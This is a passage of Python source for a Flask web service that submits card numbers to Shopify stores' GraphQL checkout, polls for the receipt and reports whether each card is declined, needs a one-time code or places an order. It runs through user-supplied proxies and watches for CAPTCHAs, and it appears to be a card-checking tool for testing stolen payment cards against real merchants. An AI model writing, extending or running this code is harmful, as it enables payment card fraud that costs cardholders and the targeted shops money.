                                "paymentMethodIdentifier": payment_identifier,
                                "sessionId": token,
                                "billingAddress": {"streetAddress": {
                                    "address1": street, "address2": address2, "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone,
                                }},
                                "cardSource": None,
                            }},
                            "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt": None,
                        }],
                        "billingAddress": {"streetAddress": {
                            "address1": street, "address2": address2, "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": firstName, "lastName": lastName,
                            "zoneCode": state, "phone": phone,
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }
            if checkpoint_data:
                submit_vars["input"]["checkpointData"] = checkpoint_data

            submit_json = {"query": MUTATION_SUBMIT, "variables": submit_vars, "operationName": "SubmitForCompletion"}
            resp, text = await make_graphql_request(session, graphql_url, {"operationName": "SubmitForCompletion"}, headers, submit_json)

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency

            try:
                rj          = json.loads(text)
                submit_data = rj.get("data", {}).get("submitForCompletion", {})
                if not submit_data:
                    errs = rj.get("errors", [])
                    if errs:
                        code = errs[0].get("code")
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                rt = submit_data.get("__typename", "")

                if rt in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = submit_data.get("receipt", {})
                    if not receipt:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                    if receipt.get("__typename") == "ProcessedReceipt":
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = receipt.get("id")

                elif rt == "SubmitFailed":
                    return False, extract_clean_response(submit_data.get("reason", "Unknown")), gateway, total_price, currency

                elif rt == "SubmitRejected":
                    for e in submit_data.get("errors", []):
                        if e.get("code"):
                            return False, e["code"], gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency

                elif rt == "Throttled":
                    return False, "Throttled", gateway, total_price, currency

                receipt = submit_data.get("receipt", {})
                if not receipt:
                    return False, "No receipt", gateway, total_price, currency
                rid = receipt.get("id")
                if not rid:
                    return False, "No receipt ID", gateway, total_price, currency

            except (json.JSONDecodeError, Exception) as e:
                return False, f"Parse error: {e}", gateway, total_price, currency

            # poll
            await asyncio.sleep(3)
            final_text = ""
            for _ in range(4):
                poll_json = {"query": QUERY_POLL, "variables": {"receiptId": rid, "sessionToken": sst}, "operationName": "PollForReceipt"}
                resp, final_text = await make_graphql_request(session, graphql_url, {"operationName": "PollForReceipt"}, headers, poll_json)

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    pj = json.loads(final_text)
                    receipt_data = pj.get("data", {}).get("receipt", {})
                    if receipt_data:
                        typename = receipt_data.get("__typename", "")
                        if typename == "ProcessedReceipt":
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == "FailedReceipt":
                            code = receipt_data.get("processingError", {}).get("code", "UNKNOWN_ERROR")
                            return True, code, gateway, total_price, currency
                        elif typename == "ActionRequiredReceipt":
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        elif typename in ("ProcessingReceipt", "WaitingReceipt"):
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass

                if "WaitingReceipt" in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if "WaitingReceipt" in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            fl = final_text.lower()
            if "actionreq" in fl or "action_required" in fl:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif "processedreceipt" in fl:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif "failedreceipt" in fl or "declined" in fl:
                code = extract_between(final_text, '{"code":"', '"') or "CARD_DECLINED"
                return True, code, gateway, total_price, currency
            else:
                return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        return False, f"Error Processing Card: {e}", gateway, total_price, currency


def parse_cc_string(cc_string):
    parts = cc_string.split("|")
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {"cc": parts[0].strip(), "mes": parts[1].strip(), "ano": parts[2].strip(), "cvv": parts[3].strip()}


# ── Flask app ─────────────────────────────────────────────────────────────────
app = Flask(__name__)


@app.route("/DrGaM", methods=["GET"])
def shopify_checker():
    try:
        site      = request.args.get("site")
        cc_string = request.args.get("cc")
        proxy_str = request.args.get("proxy")

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter (CC|MM|YYYY|CVV)", "status": False}), 400

        try:
            cc_parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get("variant")

        # Railway-safe async execution
        success, message, gateway, price, currency = asyncio.run(
            process_card(
                cc_parts["cc"], cc_parts["mes"], cc_parts["ano"], cc_parts["cvv"],
                site, variant_id, proxy_str,
            )
        )

        clean = extract_clean_response(message)
        try:
            price_float = float(price)
        except Exception:
            price_float = 0.0

        return jsonify({
            "Gateway":  gateway,
            "Price":    price_float,
            "Response": clean,
            "Status":   success,
            "Dev":      "Chirag",
            "cc":       cc_string,
        })

    except Exception as e:
        return jsonify({
            "error":    str(e),
            "status":   False,
            "Gateway":  "UNKNOWN",
            "Price":    0.0,
            "Dev":      "Chirag",
            "Response": f"ERROR: {e}",
            "cc":       request.args.get("cc", ""),
        }), 500


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8073))
    app.run(host="0.0.0.0", port=port, debug=False)
